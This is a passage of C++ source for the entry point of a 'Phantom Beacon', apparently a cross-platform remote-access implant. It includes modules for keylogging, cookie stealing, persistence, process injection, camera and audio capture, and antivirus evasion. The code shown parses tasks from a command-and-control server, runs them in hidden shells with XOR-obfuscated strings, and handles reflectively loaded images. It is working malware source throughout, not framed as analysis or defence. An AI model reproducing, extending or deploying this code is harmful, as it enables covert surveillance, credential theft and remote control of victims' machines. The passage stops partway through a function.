// ============================================================================
//  main.cpp — Phantom Beacon Entry Point (Cross-Platform)
//  ──────────────────────────────────────────────────────────
//  Beacon loop: check-in → receive tasks → execute → send results → sleep.
//
//  Build (Windows - MinGW-w64):
//    x86_64-w64-mingw32-g++ -std=c++20 -O2 -s -o beacon.exe main.cpp syscalls.o
//        -lwinhttp -lbcrypt -lws2_32 -lbthprops -lwlanapi -liphlpapi -lcrypt32 -static
//
//  Build (Windows - MSVC):
//    cl /EHsc /O2 /std:c++20 main.cpp syscalls.o /link winhttp.lib bcrypt.lib ws2_32.lib bthprops.lib wlanapi.lib iphlpapi.lib
//
//  Build (Linux / macOS):
//    g++ -std=c++17 -O2 -s -o beacon main.cpp -lcurl -lssl -lcrypto -lpthread
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #ifndef _WIN32_WINNT
    #define _WIN32_WINNT 0x0601
    #endif
    #include <windows.h>
    extern "C" BOOL clear_hw_breakpoints();
    extern "C" void flush_cpu_telemetry();
#else
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <sys/select.h>
    #include <signal.h>
    #include <errno.h>
    #include <fstream>
    #include <chrono>
    #include <thread>
    #include <cstring>
    #define Sleep(ms) std::this_thread::sleep_for(std::chrono::milliseconds(ms))
#endif
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <ctime>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <functional>
#include <utility>
#include <thread>
#include <atomic>
#include <memory>
#include <mutex>

#include "build_id.h"
#include "c2_config.h"
#include "config_encrypted.h"
#include "evasion.h"
#include "crypto.h"
#include "network.h"
#include "recon.h"
#include "portfwd.h"
#include "keylogger.h"
#include "persistence.h"
#include "task_lifecycle.h"

#include "screenshot.h"
#include "media_utils.h"
#include "gps.h"
#include "camera.h"
#include "audio.h"
#include "screen_record.h"
#include "injection.h"
#include "proxy.h"
#include "browser_pivot.h"
#include "netstat.h"
#include "cookie_stealer.h"
#include "cdp_pivot.h"
// sleep_mask.h and peb_unlink.h are self-guarded and now carry POSIX
// implementations too (masked sleep / link_map unlink), so include them on
// every platform.
#include "sleep_mask.h"
#include "peb_unlink.h"
#ifdef _WIN32
#include "sleep_ekko.h"
#include "smb.h"
#include "apc_injection.h"
#endif
#include "wlan_scan.h"
#include "bt_scan.h"
#include "inmemory.h"
#include "secure_heap.h"

// ── Minimal JSON Parser ────────────────────────────────────────────────────
// We avoid pulling in nlohmann/json to keep the binary tiny.
// This is a purpose-built parser for our specific C2 protocol.

namespace json_mini {

inline std::string get_string(const std::string& json, const std::string& key) {
    std::string key_q = XOR_DEC(XOR_STR("\"")).c_str() + key + XOR_DEC(XOR_STR("\"")).c_str();
    size_t key_pos = json.find(key_q);
    if (key_pos == std::string::npos) return "";

    size_t colon_pos = json.find(':', key_pos + key_q.length());
    if (colon_pos == std::string::npos) return "";

    size_t start_quote = json.find('"', colon_pos);
    if (start_quote == std::string::npos) return "";
    start_quote++;

    // Scan for the closing quote, skipping escaped \" so values may contain
    // quotes (e.g. shell commands with embedded quotes).
    size_t end_quote = std::string::npos;
    bool escaped = false;
    for (size_t i = start_quote; i < json.size(); ++i) {
        if (escaped) { escaped = false; continue; }
        if (json[i] == '\\') { escaped = true; continue; }
        if (json[i] == '"') { end_quote = i; break; }
    }
    if (end_quote == std::string::npos) return "";

    std::string val = json.substr(start_quote, end_quote - start_quote);
    std::string result;
    for (size_t i = 0; i < val.size(); ++i) {
        if (val[i] == '\\' && i + 1 < val.size()) {
            switch (val[i+1]) {
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                case '\\': result += '\\'; break;
                case '"':  result += '"';  break;
                default:   result += val[i+1]; break;
            }
            i++;
        } else {
            result += val[i];
        }
    }
    return result;
}

// Extract the "tasks" array from C2 response: [{"task_id":"...","command":"..."},...]
struct Task {
    std::string task_id;
    std::string command;
};

inline std::vector<Task> parse_tasks(const std::string& json) {
    std::vector<Task> tasks;
    // Find the "tasks" key
    size_t key_pos = json.find(XOR_DEC(XOR_STR("\"tasks\"")).c_str());
    if (key_pos == std::string::npos) return tasks;
    
    // Find the start of the array [
    size_t arr_start = json.find('[', key_pos);
    if (arr_start == std::string::npos) return tasks;

    // Find each { ... } object in the array, honoring strings: a } inside a
    // quoted command must not terminate the object.
    size_t pos = arr_start;
    while (true) {
        size_t obj_start = json.find('{', pos);
        if (obj_start == std::string::npos) break;
        size_t obj_end = std::string::npos;
        bool in_str = false, esc = false;
        for (size_t i = obj_start + 1; i < json.size(); ++i) {
            if (in_str) {
                if (esc) { esc = false; }
                else if (json[i] == '\\') { esc = true; }
                else if (json[i] == '"') { in_str = false; }
            } else if (json[i] == '"') {
                in_str = true;
            } else if (json[i] == '}') {
                obj_end = i;
                break;
            }
        }
        if (obj_end == std::string::npos) break;

        std::string obj = json.substr(obj_start, obj_end - obj_start + 1);
        Task t;
        t.task_id = get_string(obj, XOR_DEC(XOR_STR("task_id")).c_str());
        t.command = get_string(obj, XOR_DEC(XOR_STR("command")).c_str());
        if (!t.task_id.empty()) tasks.push_back(t);

        pos = obj_end + 1;
    }
    return tasks;
}

}  // namespace json_mini

// ── Shell Execution ────────────────────────────────────────────────────────

// Thread wrapper for asynchronous tasks
#ifdef _WIN32
DWORD WINAPI AsyncThreadWrapper(LPVOID lpParam) {
    auto* func = static_cast<std::function<void()>*>(lpParam);
    (*func)();
    delete func;
    return 0;
}
#endif

// Default budget: most commands (whoami, ls, sysinfo, wlan-scan, ...) finish
// in a second. Media captures take longer and carry their own duration, so
// the caller can raise the budget per-command.
static const int DEFAULT_TASK_TIMEOUT_MS = 30000;

// Hard ceiling on captured output for one command. A flooding command (a
// recursive cat, a verbose installer) is truncated AND killed: an unbounded
// read is how a beacon OOMs on an engagement it can no longer report.
static const size_t kMaxTaskOutput = 512 * 1024;

// run_shell_command() must never outlive its budget, and when it does it must
// take the whole process TREE with it — not just the shell it spawned. A
// `cmd.exe /c start foo.exe` that survives the timeout keeps running on the
// target with no watchdog, no output channel and no way to stop it.
//
// Windows: every child is assigned to a Job Object created with
// KILL_ON_JOB_CLOSE, so closing the handle kills the tree even if this frame
// is torn down unexpectedly. The child is created SUSPENDED, assigned, then
// resumed — otherwise it can spawn a grandchild before the assignment and
// escape the job.
//
// POSIX: the child becomes a process-group leader (setpgid on both sides to
// close the race) and the timeout kills the group with kill(-pgid, SIGKILL).
// Diagnostic trace for the spawn path. Off in every normal build; a build that
// sets it to 1 writes %TEMP%\phantom_cam_trace.log (the same file the camera
// diagnostics use) so a crash inside CreateProcess/pipe handling can be
// attributed to the exact call instead of guessed from an exception address.
#ifndef PHANTOM_SHELL_TRACE
#define PHANTOM_SHELL_TRACE 0
#endif

// Temporary diagnostic build switch: writes the check-in/task stages to
// %TEMP%\phantom_cam_trace.log (the same file media_utils::xtrace uses).
// 0 in every normal build; only flipped for a live troubleshooting build.
#ifndef PHANTOM_TASK_TRACE
#define PHANTOM_TASK_TRACE 0
#endif

#if PHANTOM_SHELL_TRACE
// ── Diagnostic-only spawn tracing ─────────────────────────────────────────
// These helpers are compiled out of every normal beacon. They answer three
// questions that a BEX64 event-log line cannot: which image are we mapped at,
// what does the TLS directory say, and which CreateProcess entry point (IAT
// slot vs GetProcAddress) faults.
static bool _ph_readable(const void* p, size_t n) {
    if (!p) return false;
    MEMORY_BASIC_INFORMATION mbi{};
    if (VirtualQuery(p, &mbi, sizeof(mbi)) == 0) return false;
    if (mbi.State != MEM_COMMIT) return false;
    if (mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD)) return false;
    const BYTE* end = static_cast<const BYTE*>(p) + n;
    return end <= static_cast<const BYTE*>(mbi.BaseAddress) + mbi.RegionSize;
}

static BYTE* _ph_image_base() {
    uintptr_t p = reinterpret_cast<uintptr_t>(&_ph_image_base) & ~static_cast<uintptr_t>(0xFFF);
    for (int i = 0; i < 0x400; ++i, p -= 0x1000) {
        const BYTE* page = reinterpret_cast<const BYTE*>(p);
        if (!_ph_readable(page, sizeof(IMAGE_DOS_HEADER))) continue;
        const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(page);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
        if (dos->e_lfanew <= 0 || dos->e_lfanew > 0x1000) continue;
        if (!_ph_readable(page + dos->e_lfanew, sizeof(DWORD))) continue;
        if (*reinterpret_cast<const DWORD*>(page + dos->e_lfanew) != IMAGE_NT_SIGNATURE)
            continue;
        if (!_ph_readable(page + dos->e_lfanew, sizeof(IMAGE_NT_HEADERS))) continue;
        return const_cast<BYTE*>(page);
    }
    return nullptr;
}

static void _ph_trace_image() {
    BYTE* base = _ph_image_base();
    if (!base) {
        media_utils::xtrace("img:not-found");
        return;
    }
    const IMAGE_NT_HEADERS* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        base + reinterpret_cast<const IMAGE_DOS_HEADER*>(base)->e_lfanew);
    char b[512];
    snprintf(b, sizeof(b),
             "img:base=%p optbase=%p delta=%lld size=%lx entry=%lx host=%p k32=%p kb=%p",
             base, reinterpret_cast<void*>(nt->OptionalHeader.ImageBase),
             static_cast<long long>(reinterpret_cast<BYTE*>(base) -
                                    reinterpret_cast<BYTE*>(nt->OptionalHeader.ImageBase)),
             static_cast<unsigned long>(nt->OptionalHeader.SizeOfImage),
             static_cast<unsigned long>(nt->OptionalHeader.AddressOfEntryPoint),
             reinterpret_cast<void*>(GetModuleHandleA(nullptr)),
             reinterpret_cast<void*>(GetModuleHandleA("kernel32.dll")),
             reinterpret_cast<void*>(GetModuleHandleA("kernelbase.dll")));
    media_utils::xtrace(b);

    const IMAGE_DATA_DIRECTORY& td =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (td.VirtualAddress && td.Size >= sizeof(IMAGE_TLS_DIRECTORY)) {
        if (_ph_readable(base + td.VirtualAddress, sizeof(IMAGE_TLS_DIRECTORY))) {
            const IMAGE_TLS_DIRECTORY* tls =
                reinterpret_cast<const IMAGE_TLS_DIRECTORY*>(base + td.VirtualAddress);
            DWORD idx = 0xFFFFFFFF;
            if (_ph_readable(reinterpret_cast<const void*>(tls->AddressOfIndex),
                             sizeof(DWORD))) {
                idx = *reinterpret_cast<const DWORD*>(tls->AddressOfIndex);
            }
            void* cb0 = nullptr;
            void* cb1 = nullptr;
            if (_ph_readable(reinterpret_cast<const void*>(tls->AddressOfCallBacks),
                             sizeof(void*) * 2)) {
                const void* const* cbs =
                    reinterpret_cast<const void* const*>(tls->AddressOfCallBacks);
                cb0 = const_cast<void*>(cbs[0]);
                cb1 = const_cast<void*>(cbs[1]);
            }
            snprintf(b, sizeof(b),
                     "tls:rva=%lx index=%lu index_ptr=%p raw=%llx..%llx zero=%lu cb=%p cb0=%p cb1=%p",
                     static_cast<unsigned long>(td.VirtualAddress),
                     static_cast<unsigned long>(idx),
                     reinterpret_cast<void*>(tls->AddressOfIndex),
                     static_cast<unsigned long long>(tls->StartAddressOfRawData),
                     static_cast<unsigned long long>(tls->EndAddressOfRawData),
                     static_cast<unsigned long>(tls->SizeOfZeroFill),
                     reinterpret_cast<void*>(tls->AddressOfCallBacks), cb0, cb1);
            media_utils::xtrace(b);
        }
    } else {
        media_utils::xtrace("tls:none");
    }

    // The exception directory is what makes SEH/unwind work for a mapped
    // image. It is diagnostic-only; Windows will not use it unless the image
    // is registered, but seeing the RVA tells us whether it exists at all.
    const IMAGE_DATA_DIRECTORY& ed =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    snprintf(b, sizeof(b), "exc:rva=%lx size=%lx",
             static_cast<unsigned long>(ed.VirtualAddress),
             static_cast<unsigned long>(ed.Size));
    media_utils::xtrace(b);
}

// Locate an imported function's IAT slot by walking the mapped image's own
// import directory. Hard-coded RVAs drift with every source change; the
// loader writes the slot the walk finds, so the diagnostic must read the same
// one.
static void** _ph_find_iat(BYTE* base, const char* wanted) {
    if (!base || !wanted) return nullptr;
    const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    const IMAGE_NT_HEADERS* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    const IMAGE_DATA_DIRECTORY& dir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir.VirtualAddress) return nullptr;

    IMAGE_IMPORT_DESCRIPTOR* desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
        base + dir.VirtualAddress);
    for (; desc->Name; ++desc) {
        DWORD thunk_rva = desc->OriginalFirstThunk ? desc->OriginalFirstThunk
                                                   : desc->FirstThunk;
        IMAGE_THUNK_DATA* thunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
            base + thunk_rva);
        IMAGE_THUNK_DATA* iat = reinterpret_cast<IMAGE_THUNK_DATA*>(
            base + desc->FirstThunk);
        for (; thunk->u1.AddressOfData; ++thunk, ++iat) {
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) continue;
            IMAGE_IMPORT_BY_NAME* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                base + thunk->u1.AddressOfData);
            if (std::strcmp(reinterpret_cast<const char*>(ibn->Name), wanted) == 0) {
                return reinterpret_cast<void**>(&iat->u1.Function);
            }
        }
    }
    return nullptr;
}

static void _ph_trace_iat() {
    BYTE* base = _ph_image_base();
    if (!base) {
        media_utils::xtrace("iat:no-image-base");
        return;
    }
    // The loader fills these slots from the import directory; reading them
    // separates "the loader put a bad pointer in the IAT" from "the exported
    // function itself faults".
    void** slot_a = _ph_find_iat(base, "CreateProcessA");
    void** slot_w = _ph_find_iat(base, "CreateProcessW");
    char b[256];
    snprintf(b, sizeof(b), "iat:base=%p A_slot=%p A_value=%p W_slot=%p W_value=%p",
             base, reinterpret_cast<void*>(slot_a),
             (slot_a && _ph_readable(slot_a, sizeof(void*))) ? *slot_a : nullptr,
             reinterpret_cast<void*>(slot_w),
             (slot_w && _ph_readable(slot_w, sizeof(void*))) ? *slot_w : nullptr);
    media_utils::xtrace(b);
}

static void _ph_trace_import(const char* name, void** slot) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE kb = GetModuleHandleA("kernelbase.dll");
    void* gpa32 = k32 ? reinterpret_cast<void*>(GetProcAddress(k32, name)) : nullptr;
    void* gpaKb = kb ? reinterpret_cast<void*>(GetProcAddress(kb, name)) : nullptr;
    void* resolved = slot ? *slot : nullptr;
    char b[512];
    snprintf(b, sizeof(b), "imp:%s slot=%p resolved=%p gpa32=%p gpaKb=%p",
             name, reinterpret_cast<void*>(slot), resolved, gpa32, gpaKb);
    media_utils::xtrace(b);
    for (const char* label : {"resolved", "gpa32", "gpaKb"}) {
        void* p = label[0] == 'r' ? resolved : label[3] == '3' ? gpa32 : gpaKb;
        MEMORY_BASIC_INFORMATION mbi{};
        if (p && VirtualQuery(p, &mbi, sizeof(mbi))) {
            snprintf(b, sizeof(b), "imp:%s %s base=%p protect=%lx type=%lx",
                     name, label, mbi.BaseAddress,
                     static_cast<unsigned long>(mbi.Protect),
                     static_cast<unsigned long>(mbi.Type));
            media_utils::xtrace(b);
        }
    }
}

typedef BOOL (WINAPI *pfnCreateProcessA)(
    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD,
    LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *pfnCreateProcessW)(
    LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD,
    LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

static bool _ph_spawn_attempt(const char* label, bool wide, bool pipes,
                              bool suspended, void* override_fn) {
    HANDLE rd = nullptr, wr = nullptr;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), nullptr, TRUE};
    STARTUPINFOA si{};
    STARTUPINFOW siW{};
    PROCESS_INFORMATION pi{};
    DWORD flags = CREATE_NO_WINDOW;
    if (suspended) flags |= CREATE_SUSPENDED | CREATE_NEW_PROCESS_GROUP;

    if (pipes) {
        if (!CreatePipe(&rd, &wr, &sa, 0)) {
            char b[128];
            snprintf(b, sizeof(b), "probe:%s pipe-fail gle=%lu", label,
                     static_cast<unsigned long>(GetLastError()));
            media_utils::xtrace(b);
            return false;
        }
        SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
        si.hStdOutput = wr;
        si.hStdError = wr;
        siW.cb = sizeof(siW);
        siW.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        siW.wShowWindow = SW_HIDE;
        siW.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
        siW.hStdOutput = wr;
        siW.hStdError = wr;
    } else {
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        siW.cb = sizeof(siW);
        siW.dwFlags = STARTF_USESHOWWINDOW;
        siW.wShowWindow = SW_HIDE;
    }

    char cmdA[] = "cmd.exe /c whoami";
    wchar_t cmdW[] = L"cmd.exe /c whoami";
    {
        char pb[192];
        snprintf(pb, sizeof(pb),
                 "probe:%s:pre tid=%lu fn=%p cmd=%p si=%p pi=%p",
                 label, static_cast<unsigned long>(GetCurrentThreadId()),
                 override_fn,
                 static_cast<void*>(wide ? static_cast<void*>(cmdW)
                                         : static_cast<void*>(cmdA)),
                 static_cast<void*>(wide ? static_cast<void*>(&siW)
                                         : static_cast<void*>(&si)),
                 static_cast<void*>(&pi));
        media_utils::xtrace(pb);
    }
    BOOL ok = FALSE;
    if (wide) {
        pfnCreateProcessW fn = override_fn
            ? reinterpret_cast<pfnCreateProcessW>(override_fn) : CreateProcessW;
        ok = fn(nullptr, cmdW, nullptr, nullptr, pipes ? TRUE : FALSE, flags,
                nullptr, nullptr, &siW, &pi);
    } else {
        pfnCreateProcessA fn = override_fn
            ? reinterpret_cast<pfnCreateProcessA>(override_fn) : CreateProcessA;
        ok = fn(nullptr, cmdA, nullptr, nullptr, pipes ? TRUE : FALSE, flags,
                nullptr, nullptr, &si, &pi);
    }
    char b[160];
    snprintf(b, sizeof(b), "probe:%s:%s gle=%lu", label,
             ok ? "ok" : "fail", static_cast<unsigned long>(GetLastError()));
    media_utils::xtrace(b);
    if (ok) {
        if (suspended) ResumeThread(pi.hThread);
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    if (wr) CloseHandle(wr);
    if (rd) CloseHandle(rd);
    return ok != FALSE;
}

// Manually mapped images are invisible to the OS loader, so Windows never
// calls their TLS callbacks for a newly created thread.  The primary beacon
// thread was attached by the reflective loader itself; task workers created
// with std::thread were not.  Any CRT state those workers touch then starts
// from NULL, which can surface as a wild jump deep inside an unrelated API.
// Attach the image's TLS block and callbacks on the worker before it runs.
static void _ph_thread_attach() {
    BYTE* base = _ph_image_base();
    if (!base) {
        media_utils::xtrace("thread:tls-no-base");
        return;
    }
    const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        media_utils::xtrace("thread:tls-no-mz");
        return;
    }
    const IMAGE_NT_HEADERS* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        media_utils::xtrace("thread:tls-no-pe");
        return;
    }
    const IMAGE_DATA_DIRECTORY& td =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!td.VirtualAddress || td.Size < sizeof(IMAGE_TLS_DIRECTORY)) {
        media_utils::xtrace("thread:tls-none");
        return;
    }
    const IMAGE_TLS_DIRECTORY* tls = reinterpret_cast<const IMAGE_TLS_DIRECTORY*>(
        base + td.VirtualAddress);
    if (!tls->AddressOfIndex ||
        !_ph_readable(reinterpret_cast<const void*>(tls->AddressOfIndex),
                      sizeof(DWORD))) {
        media_utils::xtrace("thread:tls-no-index");
        return;
    }
    DWORD index = *reinterpret_cast<const DWORD*>(tls->AddressOfIndex);
    if (index == TLS_OUT_OF_INDEXES) {
        media_utils::xtrace("thread:tls-index-invalid");
        return;
    }

    if (!TlsGetValue(index) && tls->StartAddressOfRawData
            && tls->EndAddressOfRawData > tls->StartAddressOfRawData) {
        ULONGLONG raw = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
        ULONGLONG total = raw + static_cast<ULONGLONG>(tls->SizeOfZeroFill);
        BYTE* block = static_cast<BYTE*>(VirtualAlloc(
            nullptr, static_cast<SIZE_T>(total),
            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
        if (block) {
            std::memset(block, 0, static_cast<size_t>(total));
            std::memcpy(block, reinterpret_cast<const void*>(
                            tls->StartAddressOfRawData), static_cast<size_t>(raw));
            TlsSetValue(index, block);
        }
    }

    if (tls->AddressOfCallBacks) {
        typedef void (__stdcall *pfnTlsCallback)(void*, DWORD, void*);
        pfnTlsCallback* callbacks =
            reinterpret_cast<pfnTlsCallback*>(tls->AddressOfCallBacks);
        if (_ph_readable(callbacks, sizeof(void*) * 2)) {
            for (DWORD i = 0; callbacks[i] != nullptr; ++i) {
                callbacks[i](base, DLL_THREAD_ATTACH, nullptr);
            }
        }
    }
    char b[160];
    snprintf(b, sizeof(b), "thread:tls-attached tid=%lu index=%lu base=%p",
             static_cast<unsigned long>(GetCurrentThreadId()),
             static_cast<unsigned long>(index), base);
    media_utils::xtrace(b);
}

struct _PhRawWorkerCtx {
    std::function<void()> fn;
};

static DWORD WINAPI _ph_raw_worker_entry(LPVOID p) {
    _ph_thread_attach();
    std::unique_ptr<_PhRawWorkerCtx> ctx(static_cast<_PhRawWorkerCtx*>(p));
    ctx->fn();
    return 0;
}
#endif

static std::string run_shell_command_bounded(const std::string& cmd,
                                             int budget_ms) {
    std::string output;
    bool overflow = false;
    bool timed_out = false;

#ifdef _WIN32
#if PHANTOM_SHELL_TRACE
    media_utils::xtrace("sh:enter");
#endif
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return XOR_DEC(XOR_STR("Error: pipe creation failed")).c_str();
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
#if PHANTOM_SHELL_TRACE
    media_utils::xtrace("sh:pipe");
#endif

    // The job IS the process-tree guarantee. If it cannot be created we still
    // run the command, but the timeout below then only kills the direct child.
    HANDLE job = CreateJobObjectA(nullptr, nullptr);
    if (job) {
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION limits;
        ZeroMemory(&limits, sizeof(limits));
        limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation,
                                     &limits, sizeof(limits))) {
            CloseHandle(job);
            job = nullptr;
        }
    }
#if PHANTOM_SHELL_TRACE
    media_utils::xtrace(job ? "sh:job-ok" : "sh:job-none");
#endif

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = { 0 };
    // Use cmd.exe /c to support built-ins and pipes.
    // CreateProcessA may modify the command-line buffer in place — it MUST
    // be a writable copy, never .c_str() of a const std::string.
    std::string full_cmd = XOR_DEC(XOR_STR("cmd.exe /c ")).c_str() + cmd;
    std::vector<char> cmd_buf(full_cmd.begin(), full_cmd.end());
    cmd_buf.push_back('\0');

    // CREATE_SUSPENDED so the job assignment lands before any child can run.
    DWORD flags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED;

#if PHANTOM_SHELL_TRACE
    media_utils::xtrace("sh:pre-createproc");
#endif
    if (CreateProcessA(nullptr, cmd_buf.data(), nullptr, nullptr, TRUE, flags,
                       nullptr, nullptr, &si, &pi)) {
#if PHANTOM_SHELL_TRACE
        media_utils::xtrace("sh:proc-ok");
#endif
        CloseHandle(hWrite);
        bool in_job = false;
        if (job) in_job = AssignProcessToJobObject(job, pi.hProcess) != FALSE;
        ResumeThread(pi.hThread);

        const DWORD deadline = GetTickCount() + static_cast<DWORD>(budget_ms);
#if PHANTOM_SHELL_TRACE
        media_utils::xtrace("sh:read-loop");
#endif
        for (;;) {
            DWORD avail = 0;
            // PeekNamedPipe does not block, so "no data yet" and "pipe closed"
            // stay distinguishable — which ReadFile alone cannot express.
            if (!PeekNamedPipe(hRead, nullptr, 0, nullptr, &avail, nullptr)) break;
            if (avail > 0) {
                char buffer[4096];
                DWORD want = avail < sizeof(buffer) - 1
                                 ? avail
                                 : static_cast<DWORD>(sizeof(buffer) - 1);
                DWORD got = 0;
                if (!ReadFile(hRead, buffer, want, &got, nullptr) || got == 0) break;
                buffer[got] = '\0';
                output += buffer;
                if (output.size() > kMaxTaskOutput) { overflow = true; break; }
                continue;
            }
            if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) break;
            if (GetTickCount() > deadline) { timed_out = true; break; }
            Sleep(25);
        }

#if PHANTOM_SHELL_TRACE
        media_utils::xtrace(timed_out ? "sh:read-timeout" : "sh:read-end");
#endif
        if (timed_out || overflow) {
            // The whole tree when we can prove we own it, the direct child
            // otherwise. Silence about which one happened is how an operator
            // ends up with a mystery process they cannot account for.
            if (in_job) TerminateJobObject(job, 1);
            else TerminateProcess(pi.hProcess, 1);
        }
        // Bounded: after a kill the kernel needs a moment, but an unbounded
        // wait here would re-introduce the very wedge this fixes.
#if PHANTOM_SHELL_TRACE
        media_utils::xtrace("sh:wait");
#endif
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
#if PHANTOM_SHELL_TRACE
        media_utils::xtrace("sh:proc-fail");
#endif
        output = XOR_DEC(XOR_STR("Error: CreateProcess failed")).c_str();
        CloseHandle(hWrite);
    }
    CloseHandle(hRead);
    // KILL_ON_JOB_CLOSE mops up any grandchild that outlived its parent.
    if (job) CloseHandle(job);

#else
    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) return XOR_DEC(XOR_STR("Error: pipe failed")).c_str();

    pid_t pid = fork();
    if (pid == 0) { // Child
        close(pipe_fd[0]);
        // Become a group leader so the parent can signal the whole tree.
        setpgid(0, 0);
        dup2(pipe_fd[1], STDOUT_FILENO);
        dup2(pipe_fd[1], STDERR_FILENO);
        close(pipe_fd[1]);
        execl(XOR_DEC(XOR_STR("/bin/sh")).c_str(), XOR_DEC(XOR_STR("sh")).c_str(), XOR_DEC(XOR_STR("-c")).c_str(), cmd.c_str(), (char*)NULL);
        _exit(1);
    } else if (pid > 0) { // Parent
        // Same call on both sides: whichever wins, the group exists before the
        // child can spawn and escape it.
        setpgid(pid, pid);
        close(pipe_fd[1]);

        const auto deadline = std::chrono::steady_clock::now() +
                              std::chrono::milliseconds(budget_ms);
        bool reaped = false;
        for (;;) {
            fd_set rfds;
            FD_ZERO(&rfds);
            FD_SET(pipe_fd[0], &rfds);
            // 100ms slices: short enough to notice the deadline promptly,
            // long enough not to spin.
            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 100000;
            int ready = select(pipe_fd[0] + 1, &rfds, nullptr, nullptr, &tv);

            if (ready > 0) {
                char buffer[4096];
                ssize_t n = read(pipe_fd[0], buffer, sizeof(buffer) - 1);
                if (n > 0) {
                    buffer[n] = '\0';
                    output += buffer;
                    if (output.size() > kMaxTaskOutput) { overflow = true; break; }
                } else {
                    break;  // EOF: child closed stdout, it is on its way out
                }
            } else if (ready == 0) {
                // No data. Did the child exit, and are we out of time?
                int status = 0;
                pid_t done = waitpid(pid, &status, WNOHANG);
                if (done == pid) { reaped = true; break; }
                if (std::chrono::steady_clock::now() > deadline) { timed_out = true; break; }
            } else {
                break;  // select() error (EINTR among them): stop reading
            }
        }
        close(pipe_fd[0]);

        if (timed_out || overflow) kill(-pid, SIGKILL);   // the whole group
        if (!reaped) {
            // Bounded reap, then SIGKILL: a zombie keeps its pid (and the
            // output pipe) alive forever, which is a leak, not a timeout.
            for (int i = 0; i < 20; ++i) {
                int status = 0;
                pid_t done = waitpid(pid, &status, WNOHANG);
                if (done == pid || (done < 0 && errno != EINTR)) { reaped = true; break; }
                usleep(100 * 1000);   // up to ~2s
            }
            if (!reaped) {
                kill(-pid, SIGKILL);
                int status = 0;
                waitpid(pid, &status, 0);
            }
        }
    } else {
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        return XOR_DEC(XOR_STR("Error: fork failed")).c_str();
    }
#endif

#if PHANTOM_SHELL_TRACE
    media_utils::xtrace("sh:done");
#endif
    if (output.empty()) output = XOR_DEC(XOR_STR("(no output)\n")).c_str();
    return output;
}

std::string run_shell_command(const std::string& cmd) {
    if (cmd.empty()) return XOR_DEC(XOR_STR("Error: empty command")).c_str();
